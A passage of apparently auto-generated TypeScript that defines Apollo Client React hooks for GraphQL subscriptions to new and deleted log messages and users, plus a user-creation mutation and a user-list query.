 * When your component renders, `useSubscribeToNewLogMessagesSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToNewLogMessagesSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToNewLogMessagesSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToNewLogMessagesSubscription, SubscribeToNewLogMessagesSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToNewLogMessagesSubscription, SubscribeToNewLogMessagesSubscriptionVariables>(SubscribeToNewLogMessagesDocument, options);
      }
export type SubscribeToNewLogMessagesSubscriptionHookResult = ReturnType<typeof useSubscribeToNewLogMessagesSubscription>;
export type SubscribeToNewLogMessagesSubscriptionResult = Apollo.SubscriptionResult<SubscribeToNewLogMessagesSubscription>;
export const SubscribeToDeletedLogMessagesDocument = gql`
    subscription SubscribeToDeletedLogMessages {
  deletedLogMessage {
    id
    commandId
    username
    message
    deleted
    time
  }
}
    `;

/**
 * __useSubscribeToDeletedLogMessagesSubscription__
 *
 * To run a query within a React component, call `useSubscribeToDeletedLogMessagesSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToDeletedLogMessagesSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToDeletedLogMessagesSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToDeletedLogMessagesSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToDeletedLogMessagesSubscription, SubscribeToDeletedLogMessagesSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToDeletedLogMessagesSubscription, SubscribeToDeletedLogMessagesSubscriptionVariables>(SubscribeToDeletedLogMessagesDocument, options);
      }
export type SubscribeToDeletedLogMessagesSubscriptionHookResult = ReturnType<typeof useSubscribeToDeletedLogMessagesSubscription>;
export type SubscribeToDeletedLogMessagesSubscriptionResult = Apollo.SubscriptionResult<SubscribeToDeletedLogMessagesSubscription>;
export const CreateUserDocument = gql`
    mutation CreateUser($user: UserInput!) {
  CreateUser(User: $user) {
    id
    deviceid
    access_level
    deleted
    last_online_time
    image
    username
  }
}
    `;
export type CreateUserMutationFn = Apollo.MutationFunction<CreateUserMutation, CreateUserMutationVariables>;

/**
 * __useCreateUserMutation__
 *
 * To run a mutation, you first call `useCreateUserMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useCreateUserMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [createUserMutation, { data, loading, error }] = useCreateUserMutation({
 *   variables: {
 *      user: // value for 'user'
 *   },
 * });
 */
export function useCreateUserMutation(baseOptions?: Apollo.MutationHookOptions<CreateUserMutation, CreateUserMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<CreateUserMutation, CreateUserMutationVariables>(CreateUserDocument, options);
      }
export type CreateUserMutationHookResult = ReturnType<typeof useCreateUserMutation>;
export type CreateUserMutationResult = Apollo.MutationResult<CreateUserMutation>;
export type CreateUserMutationOptions = Apollo.BaseMutationOptions<CreateUserMutation, CreateUserMutationVariables>;
export const GetUsersDocument = gql`
    query GetUsers {
  Users {
    id
    deviceid
    access_level
    deleted
    last_online_time
    image
    username
  }
}
    `;

/**
 * __useGetUsersQuery__
 *
 * To run a query within a React component, call `useGetUsersQuery` and pass it any options that fit your needs.
 * When your component renders, `useGetUsersQuery` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the query, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useGetUsersQuery({
 *   variables: {
 *   },
 * });
 */
export function useGetUsersQuery(baseOptions?: Apollo.QueryHookOptions<GetUsersQuery, GetUsersQueryVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useQuery<GetUsersQuery, GetUsersQueryVariables>(GetUsersDocument, options);
      }
export function useGetUsersLazyQuery(baseOptions?: Apollo.LazyQueryHookOptions<GetUsersQuery, GetUsersQueryVariables>) {
          const options = {...defaultOptions, ...baseOptions}
          return Apollo.useLazyQuery<GetUsersQuery, GetUsersQueryVariables>(GetUsersDocument, options);
        }
export type GetUsersQueryHookResult = ReturnType<typeof useGetUsersQuery>;
export type GetUsersLazyQueryHookResult = ReturnType<typeof useGetUsersLazyQuery>;
export type GetUsersQueryResult = Apollo.QueryResult<GetUsersQuery, GetUsersQueryVariables>;
export const SubscribeToNewUserDocument = gql`
    subscription SubscribeToNewUser {
  newUser {
    id
    deviceid
    username
    access_level
    deleted
    last_online_time
    image
  }
}
    `;

/**
 * __useSubscribeToNewUserSubscription__
 *
 * To run a query within a React component, call `useSubscribeToNewUserSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToNewUserSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToNewUserSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToNewUserSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToNewUserSubscription, SubscribeToNewUserSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToNewUserSubscription, SubscribeToNewUserSubscriptionVariables>(SubscribeToNewUserDocument, options);
      }
export type SubscribeToNewUserSubscriptionHookResult = ReturnType<typeof useSubscribeToNewUserSubscription>;
export type SubscribeToNewUserSubscriptionResult = Apollo.SubscriptionResult<SubscribeToNewUserSubscription>;
export const SubscribeToDeletedUserDocument = gql`
    subscription SubscribeToDeletedUser {
  deletedUser {
    id
    deviceid
    username
    access_level
    deleted
    last_online_time
    image
  }
}
    `;

/**
 * __useSubscribeToDeletedUserSubscription__
 *
 * To run a query within a React component, call `useSubscribeToDeletedUserSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToDeletedUserSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToDeletedUserSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToDeletedUserSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToDeletedUserSubscription, SubscribeToDeletedUserSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToDeletedUserSubscription, SubscribeToDeletedUserSubscriptionVariables>(SubscribeToDeletedUserDocument, options);
      }
export type SubscribeToDeletedUserSubscriptionHookResult = ReturnType<typeof useSubscribeToDeletedUserSubscription>;
export type SubscribeToDeletedUserSubscriptionResult = Apollo.SubscriptionResult<SubscribeToDeletedUserSubscription>;